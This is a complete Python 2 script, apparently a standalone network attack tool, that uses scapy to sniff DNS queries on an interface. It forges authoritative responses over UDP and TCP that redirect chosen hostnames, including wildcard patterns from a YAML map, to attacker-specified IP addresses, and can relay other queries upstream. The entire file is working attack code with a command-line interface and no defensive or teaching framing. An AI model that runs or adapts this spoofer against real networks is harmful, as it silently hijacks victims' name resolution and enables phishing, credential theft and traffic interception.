#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import argparse
import ipaddress
import logging
import os
import signal
import socket
import sys
import threading
import time
import yaml

from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, IPv6,
    UDP, TCP,
    send, sniff,
)

###############################################################################
# Logging helper
###############################################################################
def setup_logging(verbose, quiet):
    if verbose and quiet:
        quiet = False
    level = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
    logging.basicConfig(
        level=level,
        format='%(asctime)s %(levelname)s: %(message)s',
        datefmt='%H:%M:%S',
    )

###############################################################################
# DNS spoofer thread
###############################################################################

def _normalise_qname(name):
    return name.rstrip('.').lower()

class DNSSpoofer(threading.Thread):
    """
    One instance binds to one interface and handles both UDP & TCP queries.
    """

    def __init__(self, iface, mapping, upstream='8.8.8.8',
                 relay=False, ttl=300, bpf=None):
        threading.Thread.__init__(self)
        self.daemon = True
        self.iface   = iface
        self.mapping = mapping
        self.upstream = upstream
        self.relay    = relay
        self.ttl      = ttl
        self.bpf      = bpf or "udp or tcp port 53"

        self._running = threading.Event()
        self._running.set()
        self._tcp_thr = None

    # ------------------------------------------------------------------ helpers
    def _lookup(self, qname):
        qname = _normalise_qname(qname)
        if qname in self.mapping:
            val = self.mapping[qname]
            return val if isinstance(val, list) else [val]
        for pattern, val in (self.mapping.iteritems()
                             if hasattr(self.mapping, 'iteritems') else self.mapping.items()):
            if pattern.startswith('*.') and qname.endswith(pattern[2:]):
                return val if isinstance(val, list) else [val]
        return None

    def _build_answers(self, qname, spoof_ips, qtype):
        rr = None
        for ip in spoof_ips:
            r = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=ip)
            rr = r if rr is None else rr / r
        return rr

    def _forge_response(self, pkt, ips):
        proto = UDP if UDP in pkt else TCP
        q = pkt[DNSQR]
        answers = self._build_answers(q.qname, ips, q.qtype)
        dns_resp = DNS(id=pkt[DNS].id, qr=1, aa=1,
                       qd=q, ancount=len(ips), an=answers)

        ip_layer = (IP(src=pkt[IP].dst, dst=pkt[IP].src)
                    if IP in pkt else
                    IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src))

        if proto is UDP:
            udp = UDP(sport=53, dport=pkt[UDP].sport)
            return ip_layer/udp/dns_resp
        else:
            tcp = TCP(sport=53, dport=pkt[TCP].sport,
                      flags='PA',
                      seq=pkt[TCP].ack,
                      ack=pkt[TCP].seq + len(pkt[TCP].payload))
            return ip_layer/tcp/dns_resp

    # ------------------------------------------------------------ packet paths
    def _process_udp(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        qname = pkt[DNSQR].qname.decode()
        ips = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info("Spoofed %s -> %s", qname, ', '.join(ips))
        elif self.relay:
            self._relay(pkt)

    def _process_tcp(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        qname = pkt[DNSQR].qname.decode()
        ips = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info("(TCP) Spoofed %s -> %s", qname, ', '.join(ips))
        elif self.relay:
            self._relay(pkt)

    # ------------------------------------------------------------ UDP upstream
    def _relay(self, pkt):
        qname = pkt[DNSQR].qname.decode()
        src_ip = pkt[IP].src if IP in pkt else pkt[IPv6].src
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            logging.warning("Upstream timeout for %s", qname)
            return
        finally:
            sock.close()
        dns_resp = DNS(data)
        ip_layer  = IP(src=pkt[IP].dst, dst=src_ip)
        udp_layer = UDP(sport=53, dport=pkt[UDP].sport)
        send(ip_layer/udp_layer/dns_resp, iface=self.iface, verbose=0)

    # ---------------------------------------------------------------- run/stop
    def run(self):
        logging.info("DNS spoofing active on %s (relay=%s) – filter: '%s'",
                     self.iface, self.relay, self.bpf)

        # TCP sniffer in its own thread
        self._tcp_thr = threading.Thread(
            target=lambda: sniff(
                iface=self.iface,
                filter='tcp and (%s)' % self.bpf,
                prn=self._process_tcp,
                store=0,
                stop_filter=lambda _: not self._running.is_set(),
            )
        )
        self._tcp_thr.daemon = True
        self._tcp_thr.start()

        # UDP sniff in main thread
        sniff(iface=self.iface,
              filter='udp and (%s)' % self.bpf,
              prn=self._process_udp,
              store=0,
              stop_filter=lambda _: not self._running.is_set())

    def stop(self):
        self._running.clear()
        if self._tcp_thr and self._tcp_thr.is_alive():
            self._tcp_thr.join(1)

###############################################################################
# YAML loader
###############################################################################
def load_mapping(path_str):
    path_str = os.path.abspath(path_str)
    raw = yaml.safe_load(open(path_str))
    if not isinstance(raw, dict):
        raise ValueError("YAML file must contain a dictionary")
    mapping = {}
    iter_f = raw.iteritems if hasattr(raw, 'iteritems') else raw.items
    for hostname, value in iter_f():
        host = _normalise_qname(str(hostname))
        ips = [str(v) for v in (value if isinstance(value, list) else [value])]
        good = []
        for ip in ips:
            try:
                ipaddress.ip_address(ip)
                good.append(ip)
            except ValueError:
                logging.warning("Invalid IP %s for %s – skipped", ip, host)
        if good:
            mapping[host] = good if len(good) > 1 else good[0]
    return mapping

###############################################################################
# CLI
###############################################################################
def main():
    ap = argparse.ArgumentParser(description="DNS spoofer / relay (Py-2.7)")
    ap.add_argument('-i', '--iface', required=True)
    ap.add_argument('-m', '--map',  required=True, help='YAML mapping file')
    ap.add_argument('--relay', action='store_true',
                    help='forward unmatched queries upstream')
    ap.add_argument('--upstream', default='8.8.8.8')
    ap.add_argument('--ttl', type=int, default=300)
    g = ap.add_mutually_exclusive_group()
    g.add_argument('-v', '--verbose', action='store_true')
    g.add_argument('-q', '--quiet',   action='store_true')
    ap.add_argument('--bpf', help='extra BPF to AND with port 53')
    args = ap.parse_args()

    setup_logging(args.verbose, args.quiet)
    try:
        mapping = load_mapping(args.map)
    except Exception as exc:
        logging.error(str(exc))
        sys.exit(1)
    if not mapping:
        logging.error("No valid host→IP mappings – aborting")
        sys.exit(1)

    spoofer = DNSSpoofer(args.iface, mapping,
                         upstream=args.upstream,
                         relay=args.relay,
                         ttl=args.ttl,
                         bpf=args.bpf)
    spoofer.start()

    def _sigint(sig, frame):
        logging.info("Ctrl-C – shutting down")
        spoofer.stop()
    signal.signal(signal.SIGINT, _sigint)

    while spoofer.is_alive():
        time.sleep(0.3)
    logging.info("Bye!")

if __name__ == '__main__':
    main()
